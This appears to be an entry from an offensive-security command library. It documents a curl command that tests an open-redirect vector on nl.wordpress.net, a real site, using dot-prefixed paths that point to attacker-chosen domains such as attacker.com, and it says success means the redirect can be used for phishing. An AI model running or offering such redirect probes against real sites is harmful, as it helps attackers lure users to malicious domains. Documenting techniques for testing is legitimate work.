---
id: cmd-curl-test-subdomain-vector
data: 'curl -I http://nl.wordpress.net/.xpoc.pro'
tags:
  - recon
  - web
  - redirect
type: command
output: 'HTTP/1.1 301 Moved Permanently\nLocation: http://nl.wordpress.org.xpoc.pro'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.160Z'
verified: false
validated: true
submitted: true
---
# curl-test-subdomain-vector

## Command

```bash
curl -I http://nl.wordpress.net/.xpoc.pro
```

## Description

Tests an alternative open redirect vector by appending a subdomain via a dot-prefixed path on nl.wordpress.net.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I` | HEAD request for headers | Yes |
| `http://nl.wordpress.net/.xpoc.pro` | URL with dot-prefixed path for subdomain append | Yes |

## Examples

### Basic Usage

```bash
curl -I http://nl.wordpress.net/.xpoc.pro
```

### Advanced Usage

```bash
curl -I http://nl.wordpress.net/.attacker.com
```

## Expected Output

HTTP/1.1 301 Moved Permanently\nLocation: http://nl.wordpress.org.xpoc.pro

Indicates successful subdomain appending for phishing.

## Related

- [[commands/curl-test-malformed-path]]
- [[procedures/Exploit-Open-Redirect-via-Malformed-Paths]]
